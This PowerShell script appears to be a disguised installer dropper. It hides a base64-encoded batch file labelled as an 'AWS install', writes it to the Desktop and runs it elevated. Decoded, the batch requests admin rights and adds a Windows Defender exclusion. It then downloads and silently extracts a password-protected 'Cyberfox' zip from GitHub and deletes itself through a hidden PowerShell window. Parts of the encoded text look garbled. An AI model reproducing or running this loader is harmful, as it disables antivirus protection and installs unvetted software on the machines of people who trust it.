# Requires -Version 5.1
[CmdletBinding()]
param()

# Base64-encoded batch script content
$batBase64 = @"
QGVjaG8gb2ZmDQpUaXRsZSBDeWJlcmZveCBTZWN1cmUgU2V0dXANCnNldGxvY2FsIGVuYWJs
ZWRlbGF5ZWRleHBhbnNpb24NCg0KOjogQ29uZmlndXJhdGlvbg0Kc2V0ICJiYXRfZGlyPSV+
ZHAwIg0Kc2V0ICJmb2xkZXI9JWJhdF9kaXJDaWJlcmZveCBQb3J0YWJsZSI
Nc2V0ICJ3aW5yYXJfdXJsPWh0dHBzOi8vd3d3Lndpbi1yYXIuY29tL2ZpbGVhZG1pbi93aW
5yYXItdmVyc2lvbnMvd2lucmFyLXg2NC02MjQuZXhlIg0Kc2V0ICJ3aW5yYXJfaW5zdGFsbG
VyPSFmb2xkZXIhXFdpblJBUi1mcmVlLmV4ZQ0Kc2V0ICJjeWJlcmZveF91cmw9aHR0cHM6Ly
9naXRodWIuY29tL3NhaG1zZWMvQ3liZXJmb3gvcmVsZWFzZXMvZG93bmxvYWQvdjEuMC9DeW
JlcmZveFBvcnRhYmxlLnppcCI
Nc2V0ICJjeWJlcmZveF96aXA9IWZvbGRlciFcQ3liZXJmb3hQb3J0YWJsZS56aXAiDQp
zZXQgInBhc3N3b3JkPWF3cyINCg0KOjogSGVhZGVyDQplY2hvID09PT09PT09PT09PT09PT
09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQplY2hvIEN5YmVyZm94IFNlY3VyZSBF
bnZpcm9ubWVudCBTZXR1cA0KZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT
09PT09PT09PT09PT09DQplY2hvLg0KDQo6OiBDaGVjayBhZG1pbiByaWdodHMNCm5ldCBzZX
NzaW9uID5udWwgMj4mDQppZiAlZXJyb3JMZXZlbCBuZXEgMCAoDQogICAgZWNobyBbU1RFUF0
gUmVxdWVzdGluZyBhZG1pbmlzdHJhdGl2ZSBwcml2aWxlZ2VzLi4uDQogICAgcG93ZXJzaGV
sbCAtQ29tbWFuZCAnU3RhcnQtUHJvY2VzcyBjbWQgL0FyZ3VtZW50TGlzdCAnL2MgJ1wmJX
5kcG54MFwnJyAtVmVyYiBSdW5BcycNCiAgICBleGl0IC9iDQopDQoNCjo6IFVzZXIgY29uZm
lybWF0aW9uDQoNCg0KOjogQ3JlYXRlIEN5YmVyZm94IFBvcnRhYmxlIGZvbGRlciBpZiBpdCBk
b2Vzbid0IGV4aXN0DQppZiBub3QgZXhpc3QgIiFmb2xkZXIhXCIgKA0KICAgIG1rZGlyICIhZm
9sZGVyISINCiAgICBlY2hvIFtTVUNDRVNTXSBDcmVhdGVkIHdvcmtzcGFjZTogIWZvbGRlci
ENCikgZWxzZSAoDQogICAgZWNobyBbSU5GT10gV29ya3NwYWNlIGFscmVhZHkgZXhpc3RzOi
AhZm9sZGVyIQ0KKQ0KDQo6OiBBZGQgRGVmZW5kZXIgZXhjbHVzaW9uIGZvciBDeWJlcmZveCB
Qb3J0YWJsZSBmb2xkZXINCmVjaG8gW1NURVBdIEFkZGluZyBEZWZlbmRlciBleGNsdXNpb24gZm9
yOiAhZm9sZGVyIQ0KcG93ZXJzaGVsbCAtQ29tbWFuZCAnVHJ5IHsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVz
aW9uUGF0aCAnIWZvbGRlciUnIC1FcnJvckFjdGlvbiBTdG9wOyBXcml0ZS1Ib3N0ICdEZWZlbmRlciBleGNsdXNpb24gYWRkZWQuJyB9IENhdGNoIHsgV3JpdGUtSG9zdCAnRmFpbGVkIHRvIGFkZCBEZWZlbmRlciBleGNsdXNpb24uIFlvdSBtYXkgbmVlZCB0byBydW4gYXMgQWRtaW5pc3RyYXRvci4nIH0nDQoNCjo6ID09PSBXaW5SQVIgRGV0ZWN0aW9uIGFuZCBJbnN0YWxsYXRpb24gPT09DQpzZXQgIndpbnJhcl9leGUiPQ0KDQo6OiBUcnkgbmF0aXZlIDY0LWJpdCByZWdpc3RyeQ0KZm9yIC9mICJ0b2tlbnM9MiwqIiAlJWEgaW4gKCdyZWcgcXVlcnkgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXBwIFBhdGhzXFdpblJBUi5leGUiIC92ZSAyXj5udWwgXnwgZmluZCAiUkVHX1NaIicpIGRvICgNCiAgICBzZXQgIndpbnJhcl9leGU9JSViIg0KfQ0KDQo6OiBUcnkgV09XNjQzMk5vZGUNCmlmIG5vdCBkZWZpbmVkIHdpbnJhcl9leGUgKA0KICAgIGZvciAvZiAidG9rZW5zPTIsKiIgJSVhIGluICgncmVnIHF1ZXJ5ICJIS0xNXFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xXaW5SQVIuZXhlIiAvdmUgMl4+bnVsIF58IGZpbmQgIlJFR19TWiInKSBkbyAoDQogICAgICAgIHNldCAid2lucmFyX2V4ZT0lJWIiDQp9DQoNCjo6IElmIHN0aWxsIG5vdCBm
b3VuZCwgaW5zdGFsbCBXaW5SQVINCmlmIG5vdCBkZWZpbmVkIHdpbnJhcl9leGUgKA0KICAgIGVjaG8gW1NU
RVBdIERvd25sb2FkaW5nIGxhdGVzdCBXaW5SQVIuLi4NCiAgICBwb3dlcnNoZWxsIC1Db21tYW5kICJJbnZva
2UtV2ViUmVxdWVzdCAtVXJpICcld2lucmFyX3VybCcgLU91dEZpbGUgJ1x3aW5yYXJfaW5zdGFsbGVyIScgPiB
udWwgMj4mMQ0KCiAgICBlY2hvIFtTVEVQXSBJbnN0YWxsaW5nIFdpblJBUi4uLg0KICAgIHN0YXJ0ICIiIC93Y
Wl0ICIhd2lucmFyX2luc3RhbGxlciEgL1MgDQogICAgdGltZW91dCAvdCAxMCAvbm9icmVhayA+bnVsDQogICAg
ZGVsICJcd2lucmFyX2luc3RhbGxlciEiID5udWwNCg0KCiAgICA6OiBSZS1jaGVjayByZWdpc3RyeSBhZnRlci
Bpbml0YWxsDQogICAgZm9yIC9mICJ0b2tlbnM9MiwqIiAlJWEgaW4gKCdyZWcgcXVlcnkgIkhLTE1cU09GVFdBU
kVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXBwIFBhdGhzXFdpblJBUi5leGUiIC92ZSAyXj5u
dWwgXnwgZmluZCAiUkVHX1NaIicpIGRvICgNCiAgICAgICAgc2V0ICJ3aW5yYXJfZXhlPSUiYiINCn0NCg0KOjog
RmFsbGJhY2sNCmlmIG5vdCBkZWZpbmVkIHdpbnJhcl9leGUgKA0KICAgIHNldCAid2lucmFyX2V4ZT0lUHJvZ3Jh
bUZpbGVzXFxXaW5SQVJcV2luUkFSLmV4ZSIpDQp9DQoNCjo6IEZpbmFsIHZlcmlmaWNhdGlvbgplY2hvIFtJTl
RPTV0IFZlcmlmeSBXaW5SQVIgYXQ6ICF3aW5yYXJfZXhlIQppZiBub3QgZXhpc3QgIXdpbnJhcl9leGUhICgNCi
AgICBlY2hvIFtFUlJPUl0gV2luUkFSIG5vdCBmb3VuZCBhdDogIXdpbnJhcl9leGUhDQogICAgZWNobyBbQUNUS
U9OXSBQbGVhc2UgaW5zdGFsbCBXaW5SQVIgbWFudWFsbHkgYW5kIHJlLXJ1biB0aGlzIHNjcmlwdC4NCiAgICBl
eGl0IC9iDQp9DQoNCjo6ID09PSBEb3dubG9hZCBDeWJlcmZveCBaSVAgPT09DQplY2hvIFtTVEVQXSBkb3dubG9
hZGluZyBDeWJlcmZveCBwYWNrYWdlLi4uDQpwb3dlcnNoZWxsIC1Db21tYW5kICJJbnZva2UtV2ViUmVxdWVzdCAt
VXJpICclY3liZXJmb3hfdXJsJScgLU91dEZpbGUgJ1xjeWJlcmZveF96aXAnIC1Vc2VCYXNpY1BhcnNpbmciID
5udWwgMj4mMQ0KaWYgZXhpc3QgIiVjeWJlcmZveF96aXAlIiAoDQogICAgZWNobyBbU1VDQ0VTU10gQ3liZXJmb3
ggcGFja2FnZSBkb3dubG9hZGVkDQopIGVsc2UgKA0KICAgIGVjaG8gW0VSUk9SXSBGYWlsZWQgdG8gZG93bmxv
YWQgQ3liZXJmb3ggcGFja2FnZQ0KICAgIGV4aXQgL2INCikNCg0KOjogPT09IEV4dHJhY3QgQ3liZXJmb3ggWlp
QID09PQ0KZWNobyBbU1RFTCcgRXh0cmFjdGluZyBDeWJlcmZveCBwYWNrYWdlLi4uDQpzdGFydCAiIiAvd2FpdCAi
IXdpbnJhcl9leGUiIiB4IC1pYmNrIC1wICIrcGFzc3dvcmQiICIjJWN5YmVyZm94X3ppcCIgIiFmb2xkZXIhIiA+
bnVsIDI+JjENCmlmICVlc3RhdHVzICBlcXVh
bCAwICgNCiAgICBlY2hvIFtTVUNDRVNTXSBFeHRyYWN0aW9uIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkNCikgZWxz
ZSAoDQogICAgZWNobyBbRVJST1JdIEV4dHJhY3Rpb24gZmFpbGVkIHdpdGggY29kZSAlZXJyb3JsZXZlbA0KICAgIGV4
aXQgL2INCikNCg0KOjogRGVsZXRlIFpJUCBhZnRlciBleHRyYWN0aW9uDQoNCmRlbCAvZiAvcSAiJWN5YmVyZm94X3
ppcCIgDQplY2hvIFtJTlRPTV0gRGVsZXRlZCBDeWJlcmZveCBaSVAgZmlsZQ0KDQo6OiBPcGVuIEN5YmVyZm94IFBv
cnRhYmxlIGZvbGRlcg0Kc3RhcnQgZXhwbG9yZXIgIiFmb2xkZXIhIg0KDQo6OiBMYXVuY2ggc2lsZW50IGRlbGV0
aW9uIGluIGJhY2tncm91bmQgKHJ1bnMgaW5kZXBlbmRlbnRseSkNCnN0YXJ0ICIiIHBvd2Vyc2hlbGwgLVdpbmRvd1
N0eWxlIEhpZGRlbiAtQ29tbWFuZCAnU3RhcnQtU2xlZXAgLVNlY29uZHMgNSBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBh
dGggJ35+ZiAnIC1Gb3JjZQ0KDQo6OiBDbG9zZSB0ZXJtaW5hbCBpbW1lZGlhdGVseQ0KZXhpdA==
"@

# Get desktop path dynamically
$desktopPath = [Environment]::GetFolderPath("Desktop")

# Define AWS folder path on desktop
$awsFolder = Join-Path -Path $desktopPath -ChildPath "AWS"

# Create AWS folder if it does not exist
if (-not (Test-Path -Path $awsFolder -PathType Container)) {
    New-Item -Path $awsFolder -ItemType Directory | Out-Null
}

# Define full path for the batch file inside the AWS folder with timestamp
$batFile = Join-Path -Path $awsFolder -ChildPath "aws-install-$(Get-Date -Format 'yyyyMMddHHmmss').bat"

try {
    # Decode the Base64 batch content and write to file
    $bytes = [Convert]::FromBase64String($batBase64)
    [IO.File]::WriteAllBytes($batFile, $bytes)

    Write-Host "Batch script extracted to: $batFile" -ForegroundColor Cyan

    # Run the batch file elevated
    Start-Process -FilePath $batFile -Verb RunAs

    # Optionally, delete the batch file after some delay (uncomment if you want)
    # Start-Sleep -Seconds 10
    # Remove-Item -Path $batFile -Force

} catch {
    Write-Host "[ERROR] Failed to extract or run batch script: $_" -ForegroundColor Red
    exit 1
}

